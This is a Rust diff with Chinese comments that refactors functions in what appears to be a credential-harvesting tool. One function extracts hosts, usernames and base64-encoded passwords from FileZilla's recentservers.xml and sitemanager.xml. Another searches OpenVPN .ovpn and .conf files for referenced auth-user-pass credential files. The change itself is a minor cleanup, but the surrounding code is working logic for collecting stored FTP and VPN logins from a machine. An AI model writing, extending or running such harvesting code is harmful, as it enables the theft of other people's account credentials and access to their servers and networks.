@@ -294,18 +294,18 @@ fn extract_ftp_client_credentials() -> Result<Vec<Credential>, String> {
     let roaming = get_roaming_dir();
     let filezilla_path = roaming.join("FileZilla");
 
+    // FileZilla密码使用Base64编码存储
+    let host_re = regex::Regex::new(r"<Host>(.+?)</Host>").ok();
+    let user_re = regex::Regex::new(r"<User>(.+?)</User>").ok();
+    let pass_re = regex::Regex::new(r#"<Pass(?: encoding="base64")?>(.+?)</Pass>"#).ok();
+    let entry_re = regex::Regex::new(r"<(?:RecentServer|Server)>(.*?)</(?:RecentServer|Server)>").ok();
+
     if filezilla_path.exists() {
         for xml_file in &["recentservers.xml", "sitemanager.xml"] {
             let xml_path = filezilla_path.join(xml_file);
             if let Ok(content) = std::fs::read_to_string(&xml_path) {
-                // FileZilla密码使用Base64编码存储
-                let host_re = regex::Regex::new(r"<Host>(.+?)</Host>").ok();
-                let user_re = regex::Regex::new(r"<User>(.+?)</User>").ok();
-                let pass_re = regex::Regex::new(r#"<Pass(?: encoding="base64")?>(.+?)</Pass>"#).ok();
-
                 // 每个 RecentServer/Server 条目为一条站点记录，逐条提取
-                let entry_re = regex::Regex::new(r"<(?:RecentServer|Server)>(.*?)</(?:RecentServer|Server)>").ok();
-                if let Some(re) = entry_re {
+                if let Some(ref re) = entry_re {
                     for cap in re.captures_iter(&content) {
                         let body = cap.get(1).map(|m| m.as_str()).unwrap_or("");
                         let host = host_re.as_ref()
@@ -415,7 +415,7 @@ fn extract_vpn_credentials() -> Result<Vec<Credential>, String> {
             if let Ok(entries) = std::fs::read_dir(path) {
                 for entry in entries.flatten() {
                     let file_path = entry.path();
-                    if file_path.extension().map_or(false, |e| e == "ovpn" || e == "conf") {
+                    if file_path.extension().is_some_and(|e| e == "ovpn" || e == "conf") {
                         if let Ok(content) = std::fs::read_to_string(&file_path) {
                             // 检查是否引用了auth-user-pass文件
                             if let Some(auth_file) = parse_openvpn_auth_file(&content) {
